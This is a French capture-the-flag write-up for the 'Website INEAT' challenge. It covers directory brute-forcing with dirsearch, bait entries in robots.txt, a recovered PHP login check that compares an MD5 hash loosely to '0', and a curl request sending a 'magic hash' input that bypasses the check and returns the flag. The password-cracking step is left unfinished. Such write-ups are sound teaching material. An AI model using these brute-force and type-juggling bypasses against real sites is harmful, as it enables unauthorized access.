# Website INEAT

Après un petit tour du site, on ne trouve pas grand chose d'intéressant. On va donc utiliser un petit outil de bruteforce de répertoires.
Personellement, j'ai utilisé `diresearch.py` dispo sur github.

```
python3 dirsearch.py -u https://website.ctf.ineat.fr -e php,asc,prk -r
```

On trouve deux trois trucs intéressants :

> [09:39:55] 301 -  169B  - /files  ->  http://website.ctf.ineat.fr/files/  
> [09:39:55] 403 -  555B  - /files/  
> [09:39:58] 200 -   21KB - /index.php  
> [09:40:07] 200 -    1KB - /robots.txt  

On commence par aller jetter un oeil au fichier `robots.txt` dans lequel on trouve certaines choses intéressantes :

```
[...]
Disallow: https://website.ctf.ineat.fr/secured/flag
Disallow: https://website.ctf.ineat.fr/__secured-backup.tar.gz.gpg
Disallow: https://website.ctf.ineat.fr/INEAT{th1s-1s-n07-th3-fl4g} <-- l'humour de Jordan
```

Le premier et le troisième lien sont de baits, on s'intéresse donc plus en détail à notre archive. Il s'agit d'un `.tar.gz` chiffré avec GPG. Faute de clé, il va falloir casser le mot de passe.

[A compléter]

On a donc extrait les fichiers suivants :

```text
.
├── __secured-backup.tar.gz
├── fade.gif
├── files
│   └── style.css
├── index.php
├── not-the-flag-you-can-pass.gif
└── robots.txt
```

Le fichier `index.php` devrait contenir notre bonheur. Après avoir remplacé les noms abominables des variables par quelque chose de respectable et fait un peu de ménage, on se retrouve avec quelque chose qui ressemble à ça :

```php
$hash = hash("md5", $_POST["h1"]);

//Funny php :)
if( strpos($_POST["h1"], "hello") !== false > 0 && $hash == "0" ) {
  echo "<!-- Bien joué le flag est ".$flag."-->";
}

```

Notre mot de passe est donc hash en MD5 avant de passer dans un if un peu étrange.  
La suite demande en réalité quelques connaissances (ou recherches) sur les bizarreries de PHP. Il faut savoir qu'il existe un bug relativement connu de PHP concernant les comparaisons de hash qu'on appelle les "Magic Hashes" (il existe probablement un nom plus sérieux que je ne connais malheureusement pas). Plutôt que tout - mal - réexpliquer, je vous laisse jetter [un coup d'oeil ici](https://www.whitehatsec.com/blog/magic-hashes/) pour en apprendre un peu plus.

Globalement pour résumer, quand un hash débute par "0e" et que - pour une raison obscule - on le compare à "0", C'est la merde. Le test passera systématiquement et notre comparaison devient innutile. Il nous faut donc trouver une chaine qui produit un MD5 qui :
* Commence par "0e"
* Contient "hello"

Une bonne liste de collisions [peut-être trouvée ici](https://github.com/spaze/hashes/blob/master/md5.md).

On prend par exemple `md5(0rCCFVK5hello) => 0e341458689020068004009380684426`
Il ne nous reste plus qu'à envoyer tout ça.

```
$  curl -s https://website.ctf.ineat.fr/index.php --data "h1=0rCCFVK5hello" | grep flag
<!-- Bien joué le flag est INEAT{w34k_c0mp4r4is0n_f4iL}-->
```
